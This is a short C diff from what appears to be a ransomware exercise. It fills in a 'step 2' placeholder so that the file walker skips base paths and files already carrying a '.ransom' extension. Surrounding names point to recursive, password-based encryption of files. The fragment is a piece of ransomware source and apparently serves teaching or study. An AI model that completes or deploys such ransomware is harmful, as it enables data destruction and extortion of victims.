@@ -43,8 +43,6 @@ int iter_recursively_through_files(char *path, char *password,
     return EXIT_SUCCESS;
 }
 
-#define MAX_FILEPATH 4096
-
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
     size_t len = strlen(parentpath);
@@ -64,9 +62,20 @@ void add_file_extension(const char *filename, char *opt_filename)
 ** As you can compare with the skip_already_decrypted for the decryption algorithm,
 ** you just have to skip the basics path and all the files with the encryptes extension.
 */
+bool skip_basics_path(const char *path);
+
 bool skip_already_encrypted(const char *path)
 {
-    // step 2
+    size_t len = strlen(path);
+
+    if (skip_basics_path(path))
+        return true;
+
+    if (len >= LEN_RANSOM_EXTENSION &&
+        !strcmp(&path[len - LEN_RANSOM_EXTENSION], ".ransom"))
+        return true;
+
+    return false;
 }
 
 void remove_file_extension(const char *filename, char *opt_filename)
